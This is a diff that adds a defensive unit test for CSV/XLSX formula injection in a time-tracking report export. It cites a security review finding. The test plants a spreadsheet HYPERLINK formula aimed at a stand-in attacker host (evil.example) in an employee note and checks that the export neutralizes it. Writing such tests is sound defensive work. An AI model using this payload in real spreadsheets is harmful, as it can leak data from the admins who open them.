@@ -130,3 +130,29 @@ class TestGenerateMonthlyReport:
         size_full = len(result_full.read())
 
         assert size_full > size_empty
+
+
+class TestFormulaInjection:
+    """Review 2026-05-29 (M-SEC1): employee-controlled free-text (note,
+    sunday_exception_reason) must not be interpretable as a spreadsheet
+    formula when an admin opens the §16 export in Excel/LibreOffice."""
+
+    def test_employee_note_with_formula_is_neutralized(self, db, test_user):
+        _make_time_entry(db, test_user, date(2026, 1, 5), 8, 17, 30)
+        entry = db.query(TimeEntry).filter(TimeEntry.user_id == test_user.id).first()
+        entry.note = '=HYPERLINK("http://evil.example/?leak","ok")'
+        db.commit()
+
+        result = generate_monthly_report(db, 2026, 1)
+        wb, _ = _load_xlsx(result)
+        ws = next(
+            (wb[n] for n in wb.sheetnames if test_user.last_name in n),
+            wb[wb.sheetnames[0]],
+        )
+        target = None
+        for row in ws.iter_rows(values_only=True):
+            for val in row:
+                if isinstance(val, str) and "HYPERLINK" in val:
+                    target = val
+        assert target is not None, "note payload not found in sheet"
+        assert target.startswith("'"), f"formula not neutralized: {target!r}"
